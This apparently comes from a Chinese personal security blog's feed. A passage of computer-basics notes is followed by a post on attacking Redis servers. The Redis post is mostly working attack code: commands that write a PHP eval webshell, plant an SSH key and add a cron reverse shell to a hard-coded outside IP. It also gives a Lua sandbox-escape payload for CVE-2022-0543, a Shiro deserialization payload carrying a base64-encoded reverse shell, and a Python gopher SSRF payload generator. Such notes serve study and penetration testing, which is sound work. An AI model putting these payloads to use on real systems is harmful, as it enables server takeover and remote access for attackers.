id="静态web和动态web"><a href="#静态web和动态web" class="headerlink" title="静态web和动态web"></a>静态web和动态web</h1><p><a href="https://help.dedecms.com/shiyongshouce/moshi/mingci.html">https://help.dedecms.com/shiyongshouce/moshi/mingci.html</a></p><p>伪静态即是网站本身是动态网页如.php、.asp、.aspx等格式动态网页有时这类动态网页还跟”?”加参数来读取数据库内不同资料，伪静态就是做url重写操作(即rewrite)。</p><p>demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">跳转需求：</span><br><span class="line">访问http:<span class="comment">//www.kevin.com/p/123456.html  跳转成  http://a.aa.com/p/123456</span></span><br><span class="line"></span><br><span class="line">配置如下:</span><br><span class="line">rewrite ^/p/(\d+).html    http:<span class="comment">//www.kevin.com/p/$1 last;</span></span><br><span class="line"></span><br><span class="line">解释说明：</span><br><span class="line">\d是数字的意思 +是最少一个&#123;<span class="number">1</span>,&#125; <span class="number">1</span>到无穷大&#123;<span class="number">1</span>,<span class="number">3</span>&#125; 这样是<span class="number">1</span>-<span class="number">3</span>位数。</span><br></pre></td></tr></table></figure><h1 id="DDOS攻击和CC攻击"><a href="#DDOS攻击和CC攻击" class="headerlink" title="DDOS攻击和CC攻击"></a>DDOS攻击和CC攻击</h1><p>DDoS攻击打的是网站的服务器，而CC攻击是针对网站的页面攻击的。</p><p>用术语来说就是，一个是WEB网络层拒绝服务攻击（DDoS），一个是WEB应用层拒绝服务攻击（CC）。</p><p>网络层就是利用肉鸡的流量去攻击目标网站的服务器，针对比较本源的东西去攻击（通信信道），服务器瘫痪了，那么运行在服务器上的网站肯定也不能正常访问了。</p><p>而应用层就是我们用户看得到的东西，就比如说网页，CC攻击就是针对网页来攻击的，CC攻击本身是正常请求，网站动态页面的正常请求也会和数据库进行交互的，当这种”正常请求”达到一种程度的时候，服务器就会响应不过来，从而崩溃。</p><h1 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a>彩虹表</h1><p><a href="https://zhuanlan.zhihu.com/p/105578739">https://zhuanlan.zhihu.com/p/105578739</a></p><p><strong>彩虹表</strong>(<code>rainbow table</code>)是一个用于<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0">加密散列函数</a>逆运算的预先计算好的<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E6%9F%A5%E6%89%BE%E8%A1%A8">表</a>，常用于破解加密过的密码散列。如MD5，SHA1.</p><p> 查找表常常用于包含有限字符固定长度<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E7%BA%AF%E6%96%87%E6%9C%AC">纯文本</a><a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81">密码</a>的加密。</p><p>事先准备大量哈希链表：</p><p>X：随机生成的明文</p><p>H：哈希函数</p><p>R：自定义函数</p><p><img src="/../images/image-20220622152607746-1686284457479.png" alt="image-20220622152607746"></p><p>只保存开头和末尾位置即X和Rn。</p><p>对于经过H得到的密文C进行破解：首先使用R得到Y&#x3D;R（C），再将Y与Rn进行比较。</p><p>①如果相等，则说明密文C对应的明文P在哈希链表中的Rn-1处。原理见下图。</p><p><img src="/../images/image-20220622153058176-1686284457479.png" alt="image-20220622153058176"></p><p>②如果不相等，则说明密文C对应的明文P不在哈希链表中的Rn-1处。所以需要向前查找是否在Rn-2~R1处。</p><p>具体流程：对Y再用H和R函数，得到Y‘，与Rn比较，如果相等，则说明明文为Rn-2，如果不是，就重复步骤，直到所有哈希链表都查找过，说明破解失败。</p><p>防御手段：加密时使用盐值</p><h1 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h1><p><a href="https://cloud.tencent.com/developer/article/1688327">堆和栈的区别</a></p><blockquote><p>栈区保存声明的变量例如<code>int a=1</code>,由系统自动分配</p><p>堆区保存用户申请的变量例如<code>malloc</code>，<code>b=&amp;a</code></p><p>程序在编译变量和对函数分配内存都在栈上进行，且函数调用时参数的传递也是在栈上进行。</p></blockquote><h1 id="按值传递，按引用传递和按指针传递"><a href="#按值传递，按引用传递和按指针传递" class="headerlink" title="按值传递，按引用传递和按指针传递"></a>按值传递，按引用传递和按指针传递</h1><p><a href="https://www.junmajinlong.com/coding/pass_by_value_or_ref/">https://www.junmajinlong.com/coding/pass_by_value_or_ref/</a></p><ul><li><p>按值传递</p><blockquote><p>开辟新空间，将数据对象拷贝一份副本到新空间中</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="built_in">int</span> b=a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027160246647-1686284933113.png" alt="image-20221027160246647"></p><blockquote><p>这时候修改a或b的值，都不会影响另一个变量的值</p></blockquote></li><li><p>按引用传递</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b=a;</span><br></pre></td></tr></table></figure><blockquote><p>不开辟新空间，只是给数据对象所在空间名起了一个别名</p></blockquote><p><img src="/../images/image-20221027160357481-1686284933114.png" alt="image-20221027160357481"></p><blockquote><p>这时候修改a或b的值，应该会影响另一个变量的值，因为二者的地址是一样的。</p></blockquote></li><li><p>按指针传递</p><p>在c或c++可以操作指针的语言中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>* b=&amp;a;</span><br></pre></td></tr></table></figure><blockquote><p>在堆内存中开辟空间用来保存指针b，b指向a所在的地址（保存a的地址）。</p></blockquote><p><img src="/../images/image-20221027160713576-1686284933115.png" alt="image-20221027160713576"></p></li></ul><h1 id="阻塞和非阻塞，同步和异步，回调函数"><a href="#阻塞和非阻塞，同步和异步，回调函数" class="headerlink" title="阻塞和非阻塞，同步和异步，回调函数"></a>阻塞和非阻塞，同步和异步，回调函数</h1><p><strong>例子</strong></p><p>我要看足球比赛，但是妈妈叫我烧水，电视机在客厅，烧水要在厨房。家里有2个水壶，一个是普通的水壶，另一个是水开了会叫的那种水壶。我可以：</p><ol><li>用普通的水壶烧，人在边上看着，水开了再去看球。<strong>（同步，阻塞）</strong>这个是常规做法，但是我看球不爽了。</li><li>用普通水壶烧，人去看球，隔几分钟去厨房看看。<strong>（同步，非阻塞）</strong>这个又大问题，万一在我离开的几分钟水开了，我就麻烦了。</li><li>用会叫的水壶，人在边上看着。<strong>（异步，阻塞）</strong>这个没有问题，但是我太傻了。</li><li>用会叫的水壶，人去看球，听见水壶叫了再去看。<strong>（异步，非阻塞）</strong>这个应该是最好的。</li></ol><p>等着看球的我：阻塞</p><p>看着电视的我：非阻塞</p><p>普通水壶：同步</p><p>会叫的水壶：异步</p><p>所以，异步往往配合非阻塞，才能发挥出威力。</p><p><strong>回调函数</strong></p><p>在上面的例子中，用会叫的水壶，人去看球，听见水壶叫了再去看。<strong>（异步，非阻塞）</strong>这一方法的实现就是使用了回调函数。</p><h1 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h1><p><img src="/../images/MVC-1669639280429-1686284933115.png" alt="MVC"></p><h1 id="小端序和大端序"><a href="#小端序和大端序" class="headerlink" title="小端序和大端序"></a>小端序和大端序</h1><p><img src="/../images/image-20221209213725351.png" alt="image-20221209213725351"></p><h1 id="HTTPS单向认证"><a href="#HTTPS单向认证" class="headerlink" title="HTTPS单向认证"></a>HTTPS单向认证</h1><p><img src="/../images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnNoaWp1bjMz,size_16,color_FFFFFF,t_70.png" alt="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnNoaWp1bjMz,size_16,color_FFFFFF,t_70"></p><h1 id="HTTPS双向认证"><a href="#HTTPS双向认证" class="headerlink" title="HTTPS双向认证"></a>HTTPS双向认证</h1><p><img src="/../images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnNoaWp1bjMz,size_16,color_FFFFFF,t_70-20201225111905953-1695029830834.png" alt="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnNoaWp1bjMz,size_16,color_FFFFFF,t_70-20201225111905953"></p><h1 id="CGI与fastCGI"><a href="#CGI与fastCGI" class="headerlink" title="CGI与fastCGI"></a>CGI与fastCGI</h1><p><a href="https://www.cnblogs.com/tssc/p/10255590.html#_label4_4">关于CGI和FastCGI的理解 - 天生帅才 - 博客园</a></p><h1 id="X64、X86和X86-64"><a href="#X64、X86和X86-64" class="headerlink" title="X64、X86和X86_64"></a>X64、X86和X86_64</h1><ul><li><p>X64、X86和X86_64都是x86指令集架构</p></li><li><p>X86是x86指令集架构的32位版本。</p><blockquote><p>“x86”这个术语源自Intel 8086处理器，它是x86家族的第一款处理器。</p></blockquote></li><li><p>X64和X86_64都是x86指令集架构的64位扩展（X86_64将x86架构的兼容性与x64架构的增强功能结合起来）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis漏洞</title>
      <link href="/2023/05/10/Redis%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/05/10/Redis%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://www.cnblogs.com/Neeo/articles/12673194.html#windows">Redis - 各平台搭建Redis - 听雨危楼 - 博客园 (cnblogs.com)</a></p><p>Vulhub</p><h1 id="基本了解"><a href="#基本了解" class="headerlink" title="基本了解"></a>基本了解</h1><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p><a href="https://blog.csdn.net/qq_41384743/article/details/98211366">Redis数据库常用命令</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">redis-cli -h host                        # 免密登录</span><br><span class="line">redis-cli -h host -p port -a password    # 使用 Redis 密码登录 Redis 服务</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入命令行后</span></span><br><span class="line">config get requirepass # 查看密码</span><br><span class="line">config set requirepass passwd # 设置密码</span><br><span class="line">auth passwd # 认证</span><br><span class="line">info # 相关信息</span><br><span class="line">SET key &quot;Hello World&quot;                        # 设置键 key 的值为字符串 Hello World</span><br><span class="line">GET key                                     # 获取键 key 的值，如果 key 不存在，返回 nil 。如果key 储存的值不是字符串类型，返回一个错误</span><br><span class="line">DEL key                                     # 删除键 key</span><br><span class="line">KEYS *                                      # 获取 redis 中所有的 key,Keys 命令用于查找所有符合给定模式 pattern 的 key</span><br><span class="line">SAVE                                           # 用于创建当前数据库的备份,在 redis 安装目录中创建dump.rdb文件</span><br><span class="line">CONFIG GET requirepass                         # 用于获取 redis 服务的配置参数，通过 CONFIG 命令查看或设置配置项</span><br><span class="line">Flushall                                    # 用于清空整个 Redis 服务器的数据(删除所有数据库的所有 key)</span><br><span class="line">SELECT index                                # Redis Select 命令用于切换到指定的数据库，数据库索引号 index 用数字值指定，以 0 作为起始索引值。</span><br></pre></td></tr></table></figure><p><strong>redis服务器与客户端通信</strong></p><p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信。</p><p>抓包</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump port 6379 -w ./redis.pcap</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; auth 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set name khaz</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get name</span><br><span class="line">&quot;khaz&quot;</span><br></pre></td></tr></table></figure><p>对应的数据包如下，每一行都是用<code>\r\n</code>隔开的。</p><p><img src="/../images/image-20221118232305305.png" alt="image-20221118232305305"></p><blockquote><p>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code><br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p></blockquote><h1 id="利用备份功能写入文件"><a href="#利用备份功能写入文件" class="headerlink" title="利用备份功能写入文件"></a>利用备份功能写入文件</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>redis提供了备份数据库的功能，备份的文件名和备份的路径都可以通过</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">config <span class="built_in">set</span> dbfilename</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span></span><br></pre></td></tr></table></figure><p>来控制,从而可以实现任意文件写功能。</p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ul><li><p>数据库备份为快照文件存在一定格式(脏数据)，所以写入的内容需要加上换行符。</p></li><li><p><code>flushall</code>命令</p><p><code>flushall</code>命令会清空所有缓存数据,这个在一定程度不会造成巨大的损失，但是会给业务体验带来影响。</p><p>redis默认有16个数据库</p><p><img src="/../images/image-20230920152903603.png" alt="image-20230920152903603"></p><p>所以不用<code>flushall</code>来清空默认0号的数据库内容，只需要切换到其他的空数据库即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dbsize <span class="comment"># 查看当前数据库的key数量</span></span><br><span class="line">select 4  <span class="comment"># 选择没有数据的数据库</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="写入Webshell"><a href="#写入Webshell" class="headerlink" title="写入Webshell"></a>写入Webshell</h2><ul><li>root权限执行的redis或者以某个web服务启动的redis</li><li>知道网站web路径</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select 5</span><br><span class="line"><span class="built_in">set</span> 1 <span class="string">&#x27;\n\n&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;\n\n&#x27;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h2><ul><li>高权限</li></ul><p><img src="/../images/image-20231014092516237.png" alt="image-20231014092516237"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select 5</span><br><span class="line"><span class="built_in">set</span> 1 <span class="string">&quot;\n\n公钥内容\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="写入计划任务反弹shell"><a href="#写入计划任务反弹shell" class="headerlink" title="写入计划任务反弹shell"></a>写入计划任务反弹shell</h2><ul><li><p>root权限</p></li><li><p>Centos系统</p><blockquote><ol><li><p>因为默认redis写文件后是644的权限</p><p><strong>ubuntu</strong>要求定时任务文件权限必须是<strong>600</strong></p><p><strong>Centos</strong>的定时任务文件权限<strong>644</strong>也能执行</p></li><li><p>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p></li></ol></blockquote></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select 5</span><br><span class="line"><span class="built_in">set</span> 1 <span class="string">&#x27;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/124.220.192.120/1234 0&gt;&amp;1\n\n&#x27;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><strong>定时任务位置</strong></p><ul><li><p>&#x2F;etc&#x2F;crontab文件</p><p><img src="/../images/image-20231014145035776.png" alt="image-20231014145035776"></p></li><li><p>&#x2F;etc&#x2F;cron.xxx目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/cron.d/</span><br><span class="line">/etc/cron.hourly/</span><br><span class="line">/etc/cron.daily/</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/cron.monthly/</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231014145327815.png" alt="image-20231014145327815"></p></li><li><p>用户定时目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Debian系列（Ubuntu）</span></span><br><span class="line">/var/spool/cron/crontabs/&lt;username&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># RedHat系列（Centos）</span></span><br><span class="line">/var/spool/cron/&lt;username&gt;</span><br></pre></td></tr></table></figure></li></ul><h1 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h1><ul><li>4.x &gt;&#x3D; Version &lt;&#x3D; 5.0.5</li></ul><blockquote><p>主从复制是指将一台Redis服务器的数据，复制到其他的Redis服务器。</p><p>前者称为主节点(master)，后者称为从节点(slave).</p><p>数据的复制是单向的，只能由主节点到从节点。</p><p><strong>从节点在接收数据时，会先将自身的数据清空。</strong></p><p><strong>建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p><p>主从复制RCE简单的说就是将Rouge Server（主节点）上的恶意.so文件复制到目标主机（从节点）上，从而达到RCE。</p></blockquote><h1 id="Lua沙盒逃逸–CVE-2022-0543"><a href="#Lua沙盒逃逸–CVE-2022-0543" class="headerlink" title="Lua沙盒逃逸–CVE-2022-0543"></a>Lua沙盒逃逸–CVE-2022-0543</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul><li><p>运行在Debian系列的linux上的Redis</p><blockquote><p>实际上是系统问题，而不是redis的问题</p><p>在 Debian 系的 Linux 发行版系统上，Lua的package 变量没有被正确清除，导致攻击者可以利用它来进行 Lua 沙箱逃逸，从而执行任意系统命令。</p></blockquote></li></ul><p>借助Lua沙箱中遗留的变量<code>package</code>的<code>loadlib</code>函数来加载动态链接库<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>里的导出函数<code>luaopen_io</code>。在Lua中执行这个导出函数，即可获得<code>io</code>库，再使用其执行命令：</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p><strong>注意不同环境下的liblua库路径不同，需要指定一个正确的路径</strong></p><p>连接redis，使用<code>eval</code>命令执行上述脚本：</p><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">eval &#x27;<span class="keyword">local</span> io_l = <span class="keyword">package</span><span class="variable">.loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>); <span class="keyword">local</span> io = io_l(); <span class="keyword">local</span> f = io<span class="variable">.popen</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;r&quot;</span>); <span class="keyword">local</span> res = f:read(<span class="string">&quot;*a&quot;</span>); f:close(); <span class="keyword">return</span> res&#x27; <span class="number">0</span></span><br></pre></td></tr></table></figure><p>工具一键执行命令</p><p><img src="/../images/image-20230920151956149.png" alt="image-20230920151956149"></p><h1 id="Shiro-Redis反序列化"><a href="#Shiro-Redis反序列化" class="headerlink" title="Shiro-Redis反序列化"></a>Shiro-Redis反序列化</h1><p>shiro默认将session存储在内存里面。这样导致shiro的session是不共享的。使用redis来存储shiro session可以让其他服务也共享shiro的认证信息。</p><p>过程：shiro会根据jessionid来找到存储于redis中的session信息，并对其进行反序列化。</p><p><strong>向redis中插入恶意session信息</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyyso</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">redis_conn=redis.StrictRedis(host=<span class="string">&quot;192.168.1.104&quot;</span>, port=<span class="number">6379</span>,password=<span class="string">&quot;abc123&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># whatever 是 session 名称</span></span><br><span class="line">whatever=<span class="string">b&quot;123&quot;</span></span><br><span class="line">key=<span class="string">b&quot;shiro:session:&quot;</span>+whatever</span><br><span class="line">value=pyyso.cb1v192(<span class="string">&#x27;bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(value)</span><br><span class="line">redis_conn.<span class="built_in">set</span>(key,value)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230920210825530.png" alt="image-20230920210825530"></p><p>更改改JESSIONID为123，再次访问即可触发反序列化。</p><h1 id="SSRF打Redis"><a href="#SSRF打Redis" class="headerlink" title="SSRF打Redis"></a>SSRF打Redis</h1><h2 id="低版本情况"><a href="#低版本情况" class="headerlink" title="低版本情况"></a>低版本情况</h2><p>配合http请求</p><blockquote><p>低版本的Redis会将http请求的请求头内容作为redis命令解析</p></blockquote><h3 id="需要认证情况"><a href="#需要认证情况" class="headerlink" title="需要认证情况"></a>需要认证情况</h3><p><strong>先找到redis服务的认证密码，转到未授权情况</strong></p><ul><li><p>配置文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过requirepass来定位密码</span></span><br><span class="line">/etc/redis.conf</span><br><span class="line">/etc/redis/redis.conf</span><br><span class="line">/usr/local/redis/etc/redis.conf</span><br><span class="line">/opt/redis/ect/redis.conf</span><br></pre></td></tr></table></figure></li><li><p>弱密码爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span>://<span class="number">192.168</span><span class="number">.174</span><span class="number">.129</span>:<span class="number">6379</span>/AUTH passwd</span><br></pre></td></tr></table></figure><p>认证成功</p><p><img src="/../images/image-20221118222335249.png" alt="image-20221118222335249"></p><p>认证失败</p><p><img src="/../images/image-20221118222420964.png" alt="image-20221118222420964"></p></li></ul><h3 id="未授权情况"><a href="#未授权情况" class="headerlink" title="未授权情况"></a>未授权情况</h3><p><strong>配合dict协议</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">dict:<span class="comment">//x.x.x.x:6379/&lt;Redis 命令&gt;</span></span><br></pre></td></tr></table></figure><p><strong>配合gopher协议</strong></p><p>首先要将命令转换为RESP协议格式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request, urllib.parse, urllib.error</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.163.128&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写马</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span> <span class="comment">#写入的文件内容</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span> <span class="comment"># web目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写ssh公钥</span></span><br><span class="line">/*</span><br><span class="line">filename=<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">ssh_pub=<span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;</span></span><br><span class="line">path=<span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计划任务反弹shell  系统必须为Centos，定时任务权限问题：Centos--644  Ubuntu--600</span></span><br><span class="line">/*</span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.163.132&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;2333&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果redis需要认证，就在cmd第一行插入认证命令</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">    </span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span>  <span class="comment"># &quot;/_&quot; gopher协议特性，会吃掉url后的一个字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h1 id="Windows下的思路–没试"><a href="#Windows下的思路–没试" class="headerlink" title="Windows下的思路–没试"></a>Windows下的思路–没试</h1><p><strong>Windows的Redis版本停留在3.2</strong></p><p><strong>Windows的自启动：系统服务、计划任务、注册表启动项、用户的startup目录</strong></p><p><a href="https://xz.aliyun.com/t/7940">踩坑记录-Redis(Windows)的getshell - 先知社区 (aliyun.com)</a></p><h1 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h1><p><a href="https://github.com/yuyan-sec/RedisEXP">yuyan-sec&#x2F;RedisEXP: Redis 漏洞利用工具 (github.com)</a></p><p><a 